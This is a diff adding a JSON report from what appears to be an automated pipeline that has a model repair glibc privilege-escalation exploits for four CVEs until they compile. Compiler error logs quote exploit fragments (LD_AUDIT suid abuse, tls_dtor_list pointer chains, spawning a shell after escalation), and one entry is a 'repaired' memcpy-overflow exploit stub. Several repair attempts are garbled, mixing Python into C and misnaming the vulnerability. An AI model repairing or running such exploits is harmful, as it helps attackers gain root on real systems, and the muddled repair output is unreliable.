@@ -1,0 +1,138 @@
+{
+  "generated_at": "2026-03-27T19:42:57.161828",
+  "total_processed": 4,
+  "repaired": 1,
+  "failed": 3,
+  "details": {
+    "CVE-2011-0536:0": {
+      "repaired": false,
+      "fixed_code": null,
+      "attempts": 3,
+      "last_errors": [
+        "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:1:3: error: invalid preprocessing directive\n    1 | # FIX: previous attempt left prose line on line 12 uncommented\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:3:1: error: unknown type name 'import'\n    3 | import os\n      | ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:3:10: error: expected ';' after top level declarator\n    3 | import os\n      |          ^\n      |          ;\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:7:7: error: invalid preprocessing directive\n    7 |     # Create a temporary directory for our payload\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:10:7: error: invalid preprocessing directive\n   10 |     # Compile the payload with gcc\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:17:5: error: expected identifier or '('\n   17 |     '''\n      |     ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:20:7: error: invalid preprocessing directive\n   20 |     # Remove the temporary directory\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:23:7: error: invalid preprocessing directive\n   23 |     # Replace it with our payload\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:26:7: error: invalid preprocessing directive\n   26 |     # Execute the suid binary with LD_AUDIT set to exploit\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:28:5: error: unknown type name 'subprocess'\n   28 |     subprocess.run(['exec'], env=env)\n      |     ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:28:15: error: expected identifier or '('\n   28 |     subprocess.run(['exec'], env=env)\n      |               ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:30:27: error: expected end of line in preprocessor expression\n   30 | #if __name__ == '__main__':\n      |                           ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:30:2: error: unterminated conditional directive\n   30 | #if __name__ == '__main__':\n      |  ^\n13 errors generated."
+      ],
+      "attempt_history": [
+        {
+          "attempt": 1,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpu3u1mjvh.c:1:1: error: unknown type name 'import'\n    1 | import os\n      | ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpu3u1mjvh.c:3:3: error: invalid preprocessing directive\n    3 | # Create a payload DSO to replace the directory with a valid target for dlopen().\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpu3u1mjvh.c:1:10: error: expected ';' after top level declarator\n    1 | import os\n      |          ^\n      |          ;\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpu3u1mjvh.c:9:1: error: expected identifier or '('\n    9 | '''\n      | ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpu3u1mjvh.c:16:3: error: invalid preprocessing directive\n   16 | # Now force the link in /proc to load $ORIGIN via LD_AUDIT.\n      |   ^\n5 errors generated."
+          ],
+          "warnings": []
+        },
+        {
+          "attempt": 2,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpa8qhcnig.c:1:3: error: invalid preprocessing directive\n    1 | # FIX: previous attempt left prose line on line 12 uncommented\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpa8qhcnig.c:3:1: error: unknown type name 'def'\n    3 | def main():\n      | ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpa8qhcnig.c:3:11: error: expected function body after function declarator\n    3 | def main():\n      |           ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpa8qhcnig.c:6:17: error: invalid token at start of a preprocessor expression\n    6 | #if __name__ == \"__main__\":\n      |                 ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpa8qhcnig.c:6:2: error: unterminated conditional directive\n    6 | #if __name__ == \"__main__\":\n      |  ^\n5 errors generated."
+          ],
+          "warnings": [
+            "auto_commented_prose_attempted:1"
+          ]
+        },
+        {
+          "attempt": 3,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:1:3: error: invalid preprocessing directive\n    1 | # FIX: previous attempt left prose line on line 12 uncommented\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:3:1: error: unknown type name 'import'\n    3 | import os\n      | ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:3:10: error: expected ';' after top level declarator\n    3 | import os\n      |          ^\n      |          ;\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:7:7: error: invalid preprocessing directive\n    7 |     # Create a temporary directory for our payload\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:10:7: error: invalid preprocessing directive\n   10 |     # Compile the payload with gcc\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:17:5: error: expected identifier or '('\n   17 |     '''\n      |     ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:20:7: error: invalid preprocessing directive\n   20 |     # Remove the temporary directory\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:23:7: error: invalid preprocessing directive\n   23 |     # Replace it with our payload\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:26:7: error: invalid preprocessing directive\n   26 |     # Execute the suid binary with LD_AUDIT set to exploit\n      |       ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:28:5: error: unknown type name 'subprocess'\n   28 |     subprocess.run(['exec'], env=env)\n      |     ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:28:15: error: expected identifier or '('\n   28 |     subprocess.run(['exec'], env=env)\n      |               ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:30:27: error: expected end of line in preprocessor expression\n   30 | #if __name__ == '__main__':\n      |                           ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpuap9wf17.c:30:2: error: unterminated conditional directive\n   30 | #if __name__ == '__main__':\n      |  ^\n13 errors generated."
+          ],
+          "warnings": [
+            "auto_commented_prose_attempted:1"
+          ]
+        }
+      ]
+    },
+    "CVE-2014-5119:0": {
+      "repaired": false,
+      "fixed_code": null,
+      "attempts": 3,
+      "last_errors": [
+        "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:1:3: error: invalid preprocessing directive\n    1 | # REPAIR: Previous attempt failed to properly fix `pkexec` command injection vulnerability in CVE-2014-5119 exploit.\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:40:38: error: use of undeclared identifier 'PAGE_MASK'\n   40 |     uintptr_t baseaddr = chunkptr & ~PAGE_MASK;\n      |                                      ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:71:30: error: use of undeclared identifier 'kRlimMax'\n   71 |     setrlimit(RLIMIT_STACK, &kRlimMax);\n      |                              ^~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:72:29: error: use of undeclared identifier 'kRlimMin'\n   72 |     setrlimit(RLIMIT_DATA, &kRlimMin);\n      |                             ^~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:74:37: error: too many arguments to function call, expected single argument 'msg', have 2 arguments\n   74 |     logmessage(\"execvpe(%s...)...\", args[0]);\n      |     ~~~~~~~~~~                      ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:16:13: note: 'logmessage' declared here\n   16 | static void logmessage(const char *msg) {\n      |             ^          ~~~~~~~~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:75:28: error: use of undeclared identifier 'kCorruptCharsetEnviron'\n   75 |     execvpe(args[0], args, kCorruptCharsetEnviron);\n      |                            ^~~~~~~~~~~~~~~~~~~~~~\n6 errors generated."
+      ],
+      "attempt_history": [
+        {
+          "attempt": 1,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:78:5: error: use of undeclared identifier 'dlist_t'\n   78 |     dlist_t *chain = (dlist_t *)param;\n      |     ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:78:14: error: use of undeclared identifier 'chain'\n   78 |     dlist_t *chain = (dlist_t *)param;\n      |              ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:78:23: error: use of undeclared identifier 'dlist_t'\n   78 |     dlist_t *chain = (dlist_t *)param;\n      |                       ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:78:32: error: expected expression\n   78 |     dlist_t *chain = (dlist_t *)param;\n      |                                ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:79:5: error: use of undeclared identifier 'chain'\n   79 |     chain->func = libcaddr + _OPEN_TRANSLIT_OFF;\n      |     ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:80:5: error: use of undeclared identifier 'chain'\n   80 |     chain->obj = baseaddr + 8 + sizeof(*chain) - 4 - offsetof(known_t, fname);\n      |     ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:80:41: error: use of undeclared identifier 'chain'\n   80 |     chain->obj = baseaddr + 8 + sizeof(*chain) - 4 - offsetof(known_t, fname);\n      |                                         ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:80:63: error: use of undeclared identifier 'known_t'\n   80 |     chain->obj = baseaddr + 8 + sizeof(*chain) - 4 - offsetof(known_t, fname);\n      |                                                               ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:80:72: error: use of undeclared identifier 'fname'; did you mean 'uname'?\n   80 |     chain->obj = baseaddr + 8 + sizeof(*chain) - 4 - offsetof(known_t, fname);\n      |                                                                        ^~~~~\n      |                                                                        uname\n/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/sys/utsname.h:83:5: note: 'uname' declared here\n   83 | int uname(struct utsname *);\n      |     ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:81:5: error: use of undeclared identifier 'chain'\n   81 |     chain->map = baseaddr + 8 + sizeof(*chain);\n      |     ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:81:41: error: use of undeclared identifier 'chain'\n   81 |     chain->map = baseaddr + 8 + sizeof(*chain);\n      |                                         ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:82:5: error: use of undeclared identifier 'chain'\n   82 |     chain->next = baseaddr + 8 + 59 - strlen(kExploitDso);\n      |     ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:90:34: error: use of undeclared identifier 'chain'\n   90 |         args[i*2 + 2] = (void *) chain;\n      |                                  ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:93:19: error: use of undeclared identifier 'chain'\n   93 |     assert(memchr(chain, 0, sizeof(chain)) == NULL);\n      |                   ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:93:36: error: use of undeclared identifier 'chain'\n   93 |     assert(memchr(chain, 0, sizeof(chain)) == NULL);\n      |                                    ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:95:73: error: use of undeclared identifier 'kTlsDtorListOffset'\n   95 |     logmessage(2, \"anticipating tls_dtor_list to be at %p\\n\", bssaddr + kTlsDtorListOffset);\n      |                                                                         ^~~~~~~~~~~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:97:21: error: use of undeclared identifier 'true'\n   97 |     for (int i = 0; true; i++) {\n      |                     ^~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:100:50: error: use of undeclared identifier 'PAGE_MASK'\n  100 |         uintptr_t targetpageoffset = chunkptr & ~PAGE_MASK;\n      |                                                  ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpm6sikhhp.c:101:37: error: use of undeclared identifier 'PAGE_MASK'\n  101 |         uintptr_t chunkpageoffset = PAGE_MASK;\n      |                                     ^~~~~~~~~\nfatal error: too many errors emitted, stopping now [-ferror-limit=]\n20 errors generated."
+          ],
+          "warnings": []
+        },
+        {
+          "attempt": 2,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:36:5: error: use of undeclared identifier 'dlist_t'\n   36 |     dlist_t  *chain;\n      |     ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:36:15: error: use of undeclared identifier 'chain'\n   36 |     dlist_t  *chain;\n      |               ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:37:20: error: variable has incomplete type 'struct utsname'\n   37 |     struct utsname ubuf;\n      |                    ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:37:12: note: forward declaration of 'struct utsname'\n   37 |     struct utsname ubuf;\n      |            ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:40:20: error: use of undeclared identifier 'LOG_ERROR'\n   40 |         logmessage(LOG_ERROR, \"failed to query kernel information\");\n      |                    ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:43:16: error: use of undeclared identifier 'LOG_DEBUG'\n   43 |     logmessage(LOG_DEBUG, \"---------------------------------------------------\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:44:16: error: use of undeclared identifier 'LOG_DEBUG'\n   44 |     logmessage(LOG_DEBUG, \"CVE-2014-5119 glibc __gconv_translit_find() exploit\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:45:16: error: use of undeclared identifier 'LOG_DEBUG'\n   45 |     logmessage(LOG_DEBUG, \"------------------------ taviso & scarybeasts -----\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:48:20: error: use of undeclared identifier 'LOG_WARN'\n   48 |         logmessage(LOG_WARN, \"This proof of concept is designed for 32 bit Fedora 20\");\n      |                    ^~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:51:20: error: use of undeclared identifier 'LOG_ERROR'\n   51 |         logmessage(LOG_ERROR, \"unable to parse libc fatal error message, please try again.\");\n      |                    ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:54:16: error: use of undeclared identifier 'LOG_DEBUG'\n   54 |     logmessage(LOG_DEBUG, \"allocating space for argument structure...\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:57:20: error: use of undeclared identifier 'LOG_ERROR'\n   57 |         logmessage(LOG_ERROR, \"allocating argument structure failed\");\n      |                    ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:60:16: error: use of undeclared identifier 'LOG_DEBUG'\n   60 |     logmessage(LOG_DEBUG, \"creating command string...\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:62:28: error: incompatible integer to pointer conversion assigning to 'char *' from 'int' [-Wint-conversion]\n   62 |     args[nstrings * 2 + 1] = alloc_repeated_string(471, '/', 1, 0);\n      |                            ^ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:65:16: error: use of undeclared identifier 'LOG_DEBUG'\n   65 |     logmessage(LOG_DEBUG, \"creating a tls_dtor_list node...\");\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:67:11: error: incompatible integer to pointer conversion assigning to 'uint8_t *' (aka 'unsigned char *') from 'int' [-Wint-conversion]\n   67 |     param = alloc_repeated_string(59, 'A', 'A', 0);\n      |           ^ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:68:5: error: use of undeclared identifier 'chain'\n   68 |     chain = (void *)param;\n      |     ^~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:70:16: error: use of undeclared identifier 'LOG_DEBUG'\n   70 |     logmessage(LOG_DEBUG, \"open_translit() symbol will be at %p\", libcaddr + _OPEN_TRANSLIT_OFF);\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:71:16: error: use of undeclared identifier 'LOG_DEBUG'\n   71 |     logmessage(LOG_DEBUG, \"offsetof(struct known_trans, fname) => %u\", offsetof(known_t, fname));\n      |                ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpkv_1nr_a.c:71:81: error: use of undeclared identifier 'known_t'\n   71 |     logmessage(LOG_DEBUG, \"offsetof(struct known_trans, fname) => %u\", offsetof(known_t, fname));\n      |                                                                                 ^~~~~~~\nfatal error: too many errors emitted, stopping now [-ferror-limit=]\n20 errors generated."
+          ],
+          "warnings": []
+        },
+        {
+          "attempt": 3,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:1:3: error: invalid preprocessing directive\n    1 | # REPAIR: Previous attempt failed to properly fix `pkexec` command injection vulnerability in CVE-2014-5119 exploit.\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:40:38: error: use of undeclared identifier 'PAGE_MASK'\n   40 |     uintptr_t baseaddr = chunkptr & ~PAGE_MASK;\n      |                                      ^~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:71:30: error: use of undeclared identifier 'kRlimMax'\n   71 |     setrlimit(RLIMIT_STACK, &kRlimMax);\n      |                              ^~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:72:29: error: use of undeclared identifier 'kRlimMin'\n   72 |     setrlimit(RLIMIT_DATA, &kRlimMin);\n      |                             ^~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:74:37: error: too many arguments to function call, expected single argument 'msg', have 2 arguments\n   74 |     logmessage(\"execvpe(%s...)...\", args[0]);\n      |     ~~~~~~~~~~                      ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:16:13: note: 'logmessage' declared here\n   16 | static void logmessage(const char *msg) {\n      |             ^          ~~~~~~~~~~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpbecuq2yw.c:75:28: error: use of undeclared identifier 'kCorruptCharsetEnviron'\n   75 |     execvpe(args[0], args, kCorruptCharsetEnviron);\n      |                            ^~~~~~~~~~~~~~~~~~~~~~\n6 errors generated."
+          ],
+          "warnings": []
+        }
+      ]
+    },
+    "CVE-2011-2702:0": {
+      "repaired": true,
+      "fixed_code": "//# Exploit Title: eGlibc Signedness Vulnerability\n//# Date: November 2011\n//# Exploit Author: c0ntex\n//# Vendor Homepage: http://www.eglibc.org\n//# Software Link: http://www.eglibc.org/home\n//# Version: eGlibc supplied by Ubuntu 10.4 LTS\n//# Tested on: Ubuntu 10.4 LTS\n//# CVE : CVE-2011-2702\n\n// A delicious, yet slightly cold banquette prepared on the (jump)table\n\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char **argv)\n{\n        char * buf = NULL;\n        puts(\"Usage: ./test A 3492348247\\n\");\n        memcpy(buf, argv[1], atoi(argv[2]));\n        return 0;\n}",
+      "attempts": 1,
+      "last_errors": [],
+      "attempt_history": [
+        {
+          "attempt": 1,
+          "api_success": true,
+          "validation_passed": true,
+          "errors": [],
+          "warnings": []
+        }
+      ]
+    },
+    "CVE-2018-1000001:2": {
+      "repaired": false,
+      "fixed_code": null,
+      "attempts": 3,
+      "last_errors": [
+        "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpib06wngr.c:1:3: error: invalid preprocessing directive\n    1 | # Previous implementation left a redundant `int stat(const char *pathname, struct stat *buf);` declaration.\n      |   ^\n1 error generated."
+      ],
+      "attempt_history": [
+        {
+          "attempt": 1,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpjp3vtf9o.c:59:34: error: use of undeclared identifier 'environ'\n   59 |     execve(shellName, shellArgs, environ);\n      |                                  ^~~~~~~\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpjp3vtf9o.c:104:18: error: use of undeclared identifier 'errno'\n  104 |             if ((errno) || (*endPtr)) {\n      |                  ^~~~~\n2 errors generated."
+          ],
+          "warnings": []
+        },
+        {
+          "attempt": 2,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmp_o1lo495.c:1:3: error: invalid preprocessing directive\n    1 | # FIX: The previous script had an indentation error in the `escalateOk` label block that caused incorrect flow control.\n      |   ^\n/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmp_o1lo495.c:50:34: error: use of undeclared identifier 'environ'\n   50 |     execve(shellName, shellArgs, environ);\n      |                                  ^~~~~~~\n2 errors generated."
+          ],
+          "warnings": []
+        },
+        {
+          "attempt": 3,
+          "api_success": true,
+          "validation_passed": false,
+          "errors": [
+            "/var/folders/ww/r2cgtn4x6vb3mpxb3gwc3h200000gn/T/tmpib06wngr.c:1:3: error: invalid preprocessing directive\n    1 | # Previous implementation left a redundant `int stat(const char *pathname, struct stat *buf);` declaration.\n      |   ^\n1 error generated."
+          ],
+          "warnings": []
+        }
+      ]
+    }
+  }
+}
